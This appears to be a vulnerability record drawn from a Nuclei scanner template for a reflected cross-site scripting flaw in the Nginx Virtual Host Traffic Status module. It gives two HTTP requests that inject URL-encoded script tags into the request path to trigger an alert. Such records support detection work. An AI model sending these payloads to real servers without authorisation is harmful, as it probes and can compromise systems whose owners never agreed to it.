# Vulnerability: Nginx Virtual Host Traffic Status Module - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`nginx-module-vts-xss.yaml`)

## Description
Nginx Virtual Host Traffic Status Module contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

GET /status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

